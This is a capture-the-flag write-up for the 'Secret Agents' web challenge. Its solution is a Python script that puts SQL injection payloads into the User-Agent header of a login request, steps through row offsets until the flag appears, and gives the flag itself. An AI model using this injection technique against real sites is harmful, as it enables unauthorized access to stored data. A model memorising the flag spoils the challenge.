# [Web] Secret Agents

> Points: 110
> Solves: 547

## Description

Can you enter [the secret agent portal](https://agents.2020.chall.actf.co)? I've heard someone has a flag :eyes:

Our insider leaked [the source](https://files.actf.co/b8ec533304b09d0100428d372d8392ba4f798bded442038e045334266d758b29/app.py), but was "terminated" shortly thereafter...

> Hint: How does the site know who you are?

## Solution

Apparently, we can inject the `User-Agent` field.

```python
from requests import get

url = 'https://agents.2020.chall.actf.co/login'

def guess(offset):
    r = get(url, headers={
        "User-Agent": "' or 1 limit 1 offset {} -- -".format(offset),
    })

    if 'actf' in r.text:
        print(r.text)
        exit()

i = 0
while True:
    guess(i)
    i += 1
```

Flag `actf{nyoom_1_4m_sp33d}`
